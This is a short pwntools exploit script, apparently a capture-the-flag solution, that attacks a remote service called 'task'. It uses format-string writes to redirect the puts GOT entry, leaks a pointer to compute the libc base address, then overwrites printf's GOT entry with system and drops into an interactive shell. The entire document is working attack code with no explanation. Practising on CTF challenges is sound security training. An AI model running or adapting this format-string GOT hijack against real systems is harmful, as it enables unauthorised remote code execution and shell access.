from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'debug'
context.terminal = 'kitty'

libc = elf.libc

# p = gdb.debug('./task', gdbscript="set follow-fork-mode parent")
p = remote('rivit.dev', 10018)

payload = fmtstr_payload(6, {elf.got.puts: elf.sym.ask_user})
p.sendlineafter(':\n', payload)

p.sendlineafter(':\n', "%1$p")
libc.address = int(p.recvline().decode().strip('\n'), 16) - libc.sym._IO_2_1_stdin_ - 131
log.info("%#x", libc.address)

payload = fmtstr_payload(6, {elf.got.printf: elf.sym.system})
p.sendlineafter(':\n', payload)

p.interactive()
